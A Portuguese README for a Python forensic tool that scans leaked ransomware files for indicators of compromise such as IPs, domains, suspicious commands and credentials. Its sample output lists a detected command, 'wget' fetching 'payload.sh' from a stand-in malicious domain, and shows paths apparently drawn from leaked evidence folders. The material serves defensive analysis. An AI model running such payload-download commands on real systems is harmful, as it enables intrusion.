# IOC Searcher

Ferramenta Python para realizar buscas de **Indicators of Compromise (IOCs)** em arquivos vazados de ataques de ransomware.

## Funcionalidades

O script busca automaticamente por:

- **IPs**: Endereços IPv4 e IPv6
- **Domínios**: Nomes de domínio suspeitos
- **URLs**: Links HTTP/HTTPS
- **Comandos**: Comandos suspeitos executados (wget, curl, powershell, etc.)
- **Senhas**: Credenciais e tokens encontrados em arquivos de configuração
- **Softwares**: Menções a ferramentas de ransomware e malware

## Requisitos

- Python 3.7 ou superior
- Dependências listadas em `requirements.txt`
- Para melhor experiência no Windows: colorama (incluído automaticamente)

## Instalação

1. Clone ou baixe este repositório
2. Instale as dependências:

```bash
pip install -r requirements.txt
```

## Uso

### Uso Básico

```bash
python ioc_searcher.py <diretório>
```

Exemplo:
```bash
python ioc_searcher.py ./ransomware_files
```

### Opções

- `--output` ou `-o`: Exporta os resultados para um arquivo JSON
  ```bash
  python ioc_searcher.py ./ransomware_files --output resultados.json
  ```

- `--json-only`: Apenas exporta para JSON, sem imprimir no console
  ```bash
  python ioc_searcher.py ./ransomware_files --json-only --output resultados.json
  ```

## Tipos de Arquivos Processados

O script processa **apenas arquivos de texto**, identificados por:

- **Extensões de texto conhecidas**: `.txt`, `.log`, `.conf`, `.config`, `.ini`, `.json`, `.xml`, `.yaml`, `.yml`, `.sh`, `.bat`, `.cmd`, `.ps1`, `.py`, `.js`, `.html`, `.sql`, `.csv`, `.md`
- **Arquivos de log**: `messages`, `audit`, `syslog`, `auth.log`, `secure`, `access.log`, `error.log`, `evtx`, `eventlog`
- **Históricos de comandos**: `.history`, `.bash_history`, `.zsh_history`
- **Validação de conteúdo**: Arquivos sem extensão conhecida são verificados para confirmar se contêm texto legível

**Arquivos ignorados:**
- Arquivos binários (`.exe`, `.dll`, `.zip`, `.pdf`, `.jpg`, etc.)
- Arquivos com conteúdo binário detectado
- Arquivos que não podem ser decodificados como texto UTF-8/Latin-1

## Monitoramento de Progresso

O script mostra em tempo real o arquivo sendo processado na mesma linha (sem criar novas linhas), facilitando o acompanhamento do progresso especialmente em diretórios com milhares de arquivos.

**Exemplo de saída:**
```
[*] Total de arquivos a processar: 10753
1 de 10753: BACEN\evidencias\CMSW\Design\OldDesign\Projects\C&M Software\Design\Festas\Placas\Placas Comemorativas\Logos\SPB\Morada\SPB
2 de 10753: BACEN\evidencias\CMSW\Design\OldDesign\Projects\C&M Software\Design\Festas\Placas\Placas Comemorativas\Logos\SPB\Pecúnia\SPB
```

- **Formato**: `X de Y: caminho/completo/do/arquivo`
- **Windows**: Usa colorama para compatibilidade com sequências ANSI
- **Linux/Unix**: Funciona nativamente com controle de terminal
- **Caminhos completos**: Mostra o caminho completo do arquivo sem truncar
- **Atualização contínua**: Uma única linha é atualizada continuamente

## Estrutura do Projeto

```
IOC-Search/
├── ioc_searcher.py      # Script principal
├── ioc_detectors.py     # Módulo de detecção de IOCs
├── file_processor.py    # Módulo de processamento de arquivos
├── requirements.txt     # Dependências
└── README.md           # Este arquivo
```

## Exemplo de Saída

```
[*] Iniciando busca de IOCs em: ./ransomware_files
[*] Processando arquivos...

[*] Processamento concluído!
[*] Arquivos processados: 15
[*] Total de IOCs encontrados: 42

================================================================================
RESULTADOS DA BUSCA DE IOCs
================================================================================

[IPS]
--------------------------------------------------------------------------------

  192.168.1.100
  Arquivos (2):
    - ./ransomware_files/config.txt
    - ./ransomware_files/logs/access.log

[DOMAINS]
--------------------------------------------------------------------------------

  malicious-domain.com
  Arquivos (1):
    - ./ransomware_files/script.sh

[COMMANDS]
--------------------------------------------------------------------------------

  wget http://malicious-domain.com/payload.sh
  Arquivos (1):
    - ./ransomware_files/.bash_history

...
```

## Formato JSON de Saída

Quando exportado para JSON, os resultados seguem o formato:

```json
{
  "ips": {
    "192.168.1.100": [
      "./ransomware_files/config.txt",
      "./ransomware_files/logs/access.log"
    ]
  },
  "domains": {
    "malicious-domain.com": [
      "./ransomware_files/script.sh"
    ]
  },
  "commands": {
    "wget http://malicious-domain.com/payload.sh": [
      "./ransomware_files/.bash_history"
    ]
  },
  ...
}
```

## Notas de Segurança

⚠️ **ATENÇÃO**: Esta ferramenta é destinada apenas para fins de análise forense e pesquisa de segurança. 

- Não execute em sistemas de produção sem autorização
- Os arquivos analisados podem conter conteúdo malicioso
- Sempre use em ambientes isolados (VMs, containers)
- Revise cuidadosamente os resultados antes de tomar ações baseadas neles

## Limitações

- Arquivos binários não são processados (apenas texto)
- Arquivos maiores que 50MB são processados parcialmente (amostra)
- Alguns IOCs podem gerar falsos positivos
- A detecção de senhas pode capturar valores que não são realmente senhas

## Contribuindo

Sugestões e melhorias são bem-vindas! Sinta-se à vontade para abrir issues ou pull requests.

## Licença

Este projeto é fornecido "como está" para fins educacionais e de pesquisa.

